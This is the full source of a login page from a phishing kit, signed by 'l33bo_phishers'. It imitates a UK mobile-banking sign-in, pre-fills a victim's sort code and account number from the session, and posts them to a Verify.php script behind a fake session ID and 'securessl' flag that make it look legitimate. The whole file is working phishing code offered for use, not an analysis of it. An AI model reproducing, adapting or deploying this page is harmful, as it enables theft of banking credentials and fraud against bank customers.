<?php

error_reporting(0);

session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";

?>

<!DOCTYPE html>
<html lang="en-gb">
<head>
<link href="assets/img/001.ico" type="image/x-icon" rel="icon" />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Login</title>
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/l33bo_phishers_mobile_css.css" rel="stylesheet" type="text/css">
<style>
.lnkLevFoot a {
    color: #002663!important;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="https://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="../assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript'>
jQuery(function($){
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>
<script>
function Check() {
    var x = document.forms["login"]["sortcode"].value;
    var y = document.forms["login"]["acno"].value;
    if (x == null || x == "") {
		document.getElementById("ErrorBox").style.display = "block";
        return false;
    }
    if (y == null || y == "") {
		document.getElementById("ErrorBox").style.display = "block";
        return false;
    }
}
</script>
</head>
<body class="hasJS">
<div id="outer">
<div id="banner" style="background-color:#ffffff;border-bottom: 2px solid #002663;">
<p id="logo"><img src="assets/img/logo.png"></p>

<p class="cookiePolicy"><a href="#" id="lnkePrivacy" style="color:#ffffff">Cookie policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Welcome</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="ErrorBox" style="display:none;">
<div class="msgTL">
<div class="msgTR">
<div class="msgBR">
<div class="msgBL">
<span><br><img style="margin-left:5px" src="assets/img/loginerror.png"></span>
</div>
</div>
</div>
</div>
</div>
<div class="loginFields">
<form id="login" name="login" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" onsubmit="return Check();">
<div class="formField">
<label for="sortcode">Sort code</label>
<input disabled autocomplete="off" class="wide" id="sortcode" class="required" maxlength="8" name="sortcode" type="tel" value="<?php echo $_SESSION['sortcode'];?>">
</div>
<div class="formField">
<label for="acno">Account number</label>
<input disabled autocomplete="off" class="wide" id="acno" class="required" maxlength="8" name="acno" type="tel" value="<?php echo $_SESSION['account'];?>">
</div>
<div class="actionsLogin">
<div class="divider">
<hr></div>
<input class="submitAction" id="go" name="go" type="submit" value="Continue" style="background:#002663">
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="clearer"></div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Contact us</a></p>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote"><a href="#">Mobile Banking</a></p>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img src="assets/img/003.jpg"></a></p>
</div>
</div>
<div class="clearer"></div>
<div>
<div class="footerLinksLogin"><a href="#" >Security</a>
<a class="footerLinksLast" href="#">Legal</a></div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
?>